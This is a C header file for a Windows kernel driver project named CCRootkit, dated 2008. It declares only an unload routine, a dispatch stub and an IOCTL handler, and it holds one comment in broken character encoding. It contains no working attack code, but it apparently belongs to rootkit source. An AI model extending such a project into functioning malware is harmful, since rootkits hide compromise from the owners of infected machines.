/******************************************************************************
**
**  FileName    :   CCRootkit.h
**  Version     :   0.10
**  Author      :   embedlinux(E-mai:ccrootkit@126.com QQ:5054-3533)
**  Date        :   2008-08-04
**  Comment     :   
**
******************************************************************************/
#ifndef __CC_ROOTKIT_H__
#define __CC_ROOTKIT_H__

#include <ntddk.h>
#include "cfg.h"


//º¯ÊýÉùÃ÷
void DriverOnUnload( IN PDRIVER_OBJECT pDriverObject );
NTSTATUS OnStubDispatch(
   IN PDEVICE_OBJECT pDeviceObject,
	 IN PIRP pIrp	);
NTSTATUS RootkitIoctl(
   IN PDEVICE_OBJECT pDeviceObject,
	 IN PIRP pIrp	);
	 
#endif  //__CC_ROOTKIT_H__

